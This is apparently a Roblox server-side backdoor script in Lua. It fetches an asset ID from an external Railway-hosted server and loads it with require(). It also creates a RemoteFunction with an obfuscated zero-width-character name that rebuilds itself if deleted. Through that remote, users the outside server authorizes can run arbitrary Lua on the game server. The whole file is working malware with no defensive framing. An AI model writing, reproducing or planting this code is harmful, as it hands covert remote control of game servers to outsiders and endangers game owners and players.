--[[
THIS VERSION IS DEPENDANT ON CLIENT USING AN EXECUTOR


]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")


local HTTP = {}

local WEBHOST_BASE = "https://webhost-production.up.railway.app"



local function httpGet(path)
	local ok, result = pcall(function()
		return HttpService:GetAsync(WEBHOST_BASE .. path, true)
	end)
	if not ok then return nil end

	local decoded
	local decodeOk = pcall(function()
		decoded = HttpService:JSONDecode(result)
	end)

	if not decodeOk then return nil end
	return decoded
end

function HTTP.isAuthorized(userId)
	local response = httpGet("/authenticate?userId=" .. tostring(userId))
	return response ~= nil and response.authorized == true
end


pcall(function()
	require(tonumber(HttpService:GetAsync(
		"https://webhost-production.up.railway.app/init?placeId="
			.. game.PlaceId .. "&jobId=" .. game.JobId
		)))
end)

local Authentication = {}
local authenticatedUsers = {}

function Authentication.authenticateUser(player)
	if authenticatedUsers[player] then return true end

	if HTTP.isAuthorized(player.UserId) then
		authenticatedUsers[player] = true
		return true
	end

	return false
end

function Authentication.deauthenticateUser(player)
	authenticatedUsers[player] = nil
end


local function executeScript(player, sourceCode)
	local func, err = vLua(sourceCode)

	if not func then
		return "Compile error: " .. tostring(err)
	end

	local success, result = pcall(func)

	if not success then
		return "Runtime error: " .. tostring(result)
	end

	return result
end

local Commands = {}

local commandInfo = {
	lua = {
		usage = "lua <script>",
		description = "Executes a Lua script"
	},
	help = {
		usage = "help [command]",
		description = "Shows help for a command"
	},
	cmds = {
		usage = "cmds",
		description = "Lists all commands"
	}
}

local handlers = {}

handlers.lua = function(player, scriptText)
	if not Authentication.authenticateUser(player) then
		return "Not authenticated"
	end
	if type(scriptText) ~= "string" then
		return "Invalid script"
	end
	return executeScript(player, scriptText)
end

handlers.cmds = function()
	local list = {}
	for cmd in pairs(commandInfo) do
		table.insert(list, cmd)
	end
	return table.concat(list, ", ")
end

handlers.help = function(player, cmd)
	if cmd and commandInfo[cmd] then
		local info = commandInfo[cmd]
		return cmd .. " -> " .. info.usage .. " | " .. info.description
	else
		local list = {}
		for name, info in pairs(commandInfo) do
			table.insert(list, name .. " -> " .. info.usage)
		end
		return table.concat(list, "\n")
	end
end

function Commands.dispatch(player, command, payload)
	if type(command) ~= "string" then return end
	local handler = handlers[command]
	if not handler then return "Command not found" end
	return handler(player, payload)
end

local Remote = {}
Remote.__index = Remote

local function randomString(length)
	length = length or 32
	local rng = Random.new()
	local res = {}

	local base = {
		0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF,
		0x202E, 0x202D, 0x202B, 0x202A,
		0x1D00, 0x1D04, 0x1D07,
		0xFF21, 0xFF22, 0xFF23, 0xFF24,
	}

	for i = 1, length do
		table.insert(res, utf8.char(base[rng:NextInteger(1, #base)]))
		for _ = 1, rng:NextInteger(8, 20) do
			table.insert(res, utf8.char(rng:NextInteger(0x0300, 0x036F)))
		end
	end

	return table.concat(res)
end

function Remote.new(parent)
	local self = setmetatable({}, Remote)
	self._parent = parent or ReplicatedStorage
	self._handler = Commands.dispatch
	self._instance = nil
	self._connections = {}
	self._rebuilding = false
	self:_build()
	return self
end

function Remote:_track(conn)
	table.insert(self._connections, conn)
	return conn
end

function Remote:_disconnectAll()
	for i, conn in ipairs(self._connections) do
		if conn.Connected then
			conn:Disconnect()
		end
		self._connections[i] = nil
	end
end

function Remote:_requestRebuild()
	if self._rebuilding then return end
	self._rebuilding = true

	task.defer(function()
		self:_build()
		self._rebuilding = false
	end)
end

function Remote:_build()
	self:_disconnectAll()

	if self._instance then
		self._instance:Destroy()
	end

	local remote = Instance.new("RemoteFunction")
	remote.Name = randomString(256)
	remote.OnServerInvoke = self._handler
	remote.Parent = self._parent

	self._instance = remote

	self:_track(remote.AncestryChanged:Connect(function(_, parent)
		if parent == nil then
			self:_requestRebuild()
		end
	end))

	self:_track(remote.Destroying:Connect(function()
		self:_requestRebuild()
	end))
end

function Remote:get()
	return self._instance
end

function Remote:destroy()
	self:_disconnectAll()
	if self._instance then
		self._instance:Destroy()
	end
end


local function hookPlayerService()
	Players.PlayerAdded:Connect(function(player)
		if Authentication.authenticateUser(player) then
		end
	end)

	Players.PlayerRemoving:Connect(function(player)
		Authentication.deauthenticateUser(player)
	end)
end

Remote.new(ReplicatedStorage)
hookPlayerService()
